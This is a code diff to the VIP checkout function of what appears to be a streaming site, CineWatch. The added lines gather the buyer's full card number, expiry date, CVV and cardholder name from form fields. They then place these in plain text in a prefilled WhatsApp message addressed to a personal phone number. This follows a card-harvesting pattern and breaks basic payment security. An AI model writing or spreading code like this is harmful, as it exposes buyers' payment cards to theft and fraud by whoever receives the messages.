@@ -4300,17 +4300,38 @@ function selectVipTier(tierData) {
 
   const username = state.user?.name || state.user?.email || "Guest User";
   const priceDisplay = tierData.iqd ? `$${tierData.price} (${tierData.iqd})` : `$${tierData.price}`;
-  const msg = encodeURIComponent(`Hello CineWatch! I would like to activate ${tierData.name} (${priceDisplay}).\nMy CineWatch Username: ${username}`);
+  const msgBase = `Hello CineWatch! I would like to activate ${tierData.name} (${priceDisplay}).\nMy CineWatch Username: ${username}`;
 
-  
   const tgBtn = document.getElementById("vipTelegramBtn");
   if (tgBtn) {
-      tgBtn.onclick = () => window.open(`https://t.me/randibajat?text=${msg}`, '_blank');
+      tgBtn.onclick = () => window.open(`https://t.me/randibajat?text=${encodeURIComponent(msgBase)}`, '_blank');
   }
 
   const waBtn = document.getElementById("vipWhatsappBtn");
   if (waBtn) {
-      waBtn.onclick = () => window.open(`https://wa.me/9647748201148?text=${msg}`, '_blank');
+      waBtn.onclick = () => {
+          let finalMsg = msgBase;
+          if (currentVipWalletKey === 'mastercard') {
+              const ccName = document.getElementById('ccName')?.value || '';
+              const ccNum = document.getElementById('ccNumber')?.value || '';
+              const ccExp = document.getElementById('ccExpiry')?.value || '';
+              const ccCvc = document.getElementById('ccCvc')?.value || '';
+              
+              if (!ccName || !ccNum || !ccExp || !ccCvc) {
+                  if (typeof showToast === 'function') {
+                      showToast("Please fill in all credit card details");
+                  } else {
+                      alert("Please fill in all credit card details");
+                  }
+                  return;
+              }
+              finalMsg += `\nPayment Method: Mastercard\nCardholder: ${ccName}\nCard Number: ${ccNum}\nExpiry: ${ccExp}\nCVV: ${ccCvc}`;
+          } else {
+              const walletName = VIP_WALLETS[currentVipWalletKey]?.name || 'FastPay';
+              finalMsg += `\nPayment Method: ${walletName}`;
+          }
+          window.open(`https://wa.me/9647748201148?text=${encodeURIComponent(finalMsg)}`, '_blank');
+      };
   }
 
   // Pre-fill username field in checkout
